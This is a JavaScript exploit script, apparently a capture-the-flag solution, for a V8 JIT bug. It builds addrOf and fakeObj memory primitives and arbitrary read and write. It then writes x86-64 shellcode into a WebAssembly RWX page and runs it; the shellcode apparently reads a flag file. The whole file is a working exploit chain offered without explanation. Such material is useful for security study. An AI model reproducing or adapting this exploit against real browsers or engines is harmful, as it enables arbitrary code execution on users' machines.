/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var obj     = { "obj": 1 };
var fltArr  = [ 1.1, 2.2, 3.3, 4.4 ];
var objArr  = [ obj, obj ];

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) {
    return "0x" + Number(val).toString(16);
}

function evilGet(arr, idx) {
    for (let i = 0; i < arr.length; ++i) {
        sum = arr[i];
    }
    return arr[idx];
}

function evilSet(arr, idx, val) {
    for (let i = 0; i < arr.length; ++i) {
        sum = arr[i];
    }
    arr[idx] = val;
    return 0;
}

function triggerJITBug() {
    for (let i = 0; i < 100000; ++i) {
        evilGet(fltArr, 0);
        evilSet(fltArr, 0, 1.1);
    }
}

function leakAddrs() {
    objArr = [ obj, obj ];
    return ftoi(evilGet(objArr, 1));
}

function addrOf(o) {
    objArr = [ o, o ];
    evilSet(objArr, 1, itof((objProps<<32n) | fltMap));
    let result = objArr[0];
    evilSet(objArr, 1, itof((objProps<<32n) | objMap));
    return ftoi(result) >> 32n;
}

function fakeObj(addr) {
    obj = { "a": 1 };
    objArr = [ obj, obj ];
    evilSet(objArr, 0, itof(addr));
    return objArr[0];
}

function readData(addr) {
    var fakeObject = [
        itof((objProps<<32n) | fltMap),
        itof((0x1n<<33n) | (addr - 0x8n)),
        1.1,
        1.2
    ];
    let fakeObjectAddr = addrOf(fakeObject);
    let resultObj = fakeObj(fakeObjectAddr - 0x20n);
    %DebugPrint(resultObj);
    return ftoi(resultObj[0]);
}

function writeData(addr, val) {
    var fakeObject = [
        itof((objProps<<32n) | fltMap),
        itof((0x1n<<33n) | (addr - 0x8n)),
        1.1,
        1.2
    ];
    let fakeObjectAddr = addrOf(fakeObject);
    let resultObj = fakeObj(fakeObjectAddr - 0x20n);
    resultObj[0] = itof(val);
}

function copyshellcode(addr, shellcode) {
    addr = BigInt(addr);
    buf = new ArrayBuffer(0x100);
    dataview = new DataView(buf);
    buf_addr = addrOf(buf);
    backing_store_addr = BigInt(buf_addr) + 0x14n;
    fake = writeData(backing_store_addr, BigInt(addr));
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

triggerJITBug();
var objAddrs = leakAddrs();
var objMap = objAddrs & 0xffffffffn;
var objProps = objAddrs >> 32n;
console.log("[+] PACKED_ELEMENTS map @", hex(objMap));
console.log("[+] properties @", hex(objProps));
var fltMap = objMap - 0x50n;
console.log("[+] PACKED_DOUBLE_ELEMENTS map @", hex(fltMap));

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;

var leaker = addrOf(wasm_instance);
var rwx_page = readData(BigInt(leaker)+0x68n);
console.log("[+] RWX page @", hex(rwx_page));
shellcode = [0x747868, 0x2eb84800, 0x616c662f, 0x50742e67, 0x6ae78948, 0x6a5e00, 0x58026a5a, 0x8948050f, 0xe68948c7, 0x6a5a646a, 0x50f5800, 0x6a5f016a, 0x50f5801];
copyshellcode("0x" + rwx_page.toString(16), shellcode);
pwn();
